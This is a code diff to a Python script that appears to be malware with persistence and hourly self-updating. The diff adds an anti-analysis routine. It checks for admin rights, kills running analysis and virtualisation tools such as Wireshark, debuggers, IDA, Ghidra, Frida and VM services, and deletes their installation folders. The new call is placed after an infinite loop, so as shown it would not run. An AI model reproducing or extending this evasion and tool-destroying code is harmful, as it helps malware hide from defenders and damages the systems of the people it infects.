@@ -23,6 +23,8 @@ import subprocess
 import shutil
 import sys
 import sqlite3
+import psutil
+import getpass
 import tempfile
 
 is_watcher = "--watcher" in sys.argv
@@ -409,6 +411,87 @@ WantedBy=default.target
             print("[!] Failed to load LaunchAgent. Check permissions or SIP settings.")
 
 
+def is_admin():
+    try:
+        if os.name == 'nt':
+            # Windows
+            return os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin()
+        else:
+            # Linux/macOS
+            return os.getuid() == 0
+    except:
+        return False
+
+def kill_if_running(proc_name):
+    for proc in psutil.process_iter(['name', 'pid']):
+        try:
+            if proc_name.lower() in proc.info['name'].lower():
+                print(f"[!] Found: {proc.info['name']} (PID: {proc.info['pid']})")
+                try:
+                    proc.kill()
+                    print(f"[+] Killed {proc.info['name']}")
+                except psutil.AccessDenied:
+                    print(f"[-] Access denied to kill {proc.info['name']} - Skipping")
+                except Exception as e:
+                    print(f"[-] Error killing {proc.info['name']}: {e}")
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+
+def delete_app_if_possible(app_path):
+    if os.path.exists(app_path):
+        try:
+            if os.access(app_path, os.W_OK):
+                if os.path.isdir(app_path):
+                    shutil.rmtree(app_path)
+                else:
+                    os.remove(app_path)
+                print(f"[+] Removed app: {app_path}")
+            else:
+                print(f"[-] No permission to delete {app_path}")
+        except Exception as e:
+            print(f"[-] Failed to delete {app_path}: {e}")
+
+def detect_and_block_tools():
+    system = platform.system()
+    current_user = getpass.getuser()
+    is_root = is_admin()
+    print(f"[*] OS Detected: {system} | User: {current_user} | Root/Admin: {is_root}")
+
+    # 🔎 أدوات مراقبة وتحليل شائعة
+    suspicious_processes = [
+        "wireshark", "tcpdump", "fiddler", "procmon", "processhacker",
+        "ollydbg", "x64dbg", "ida64", "ida", "regshot", "dumpcap",
+        "sandboxie", "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
+        "frida-server", "frida", "gdb", "strace", "ltrace", "radare2",
+        "ghidra", "volatility", "sleuthkit", "autopsy"
+    ]
+
+    # 🔐 مسارات شائعة لحذف الأدوات (إذا ممكن)
+    known_paths = {
+        "Windows": [
+            "C:\\Program Files\\Wireshark\\",
+            "C:\\Program Files\\Process Hacker 2\\",
+            "C:\\Program Files\\IDA Pro\\"
+        ],
+        "Linux": [
+            "/usr/bin/wireshark", "/usr/bin/ida64", "/usr/bin/gdb"
+        ],
+        "Darwin": [  # macOS
+            "/Applications/Wireshark.app/",
+            "/Applications/IDA Pro.app/",
+        ]
+    }
+
+    print("[*] Searching for known processes...")
+    for proc in suspicious_processes:
+        kill_if_running(proc)
+
+    print("[*] Attempting to delete known app paths (if accessible)...")
+    for path in known_paths.get(system, []):
+        delete_app_if_possible(path)
+
+    print("[+] Anti-analysis operations completed.\n")
+
 # ===== تشغيل البرنامج بشكل دائم =====
 def run_every_hour():
     while True:
@@ -438,3 +521,5 @@ if __name__ == "__main__":
 
         # 6. تحديث السكربت كل ساعة بشكل مستمر
         run_every_hour()
+        
+        detect_and_block_tools()
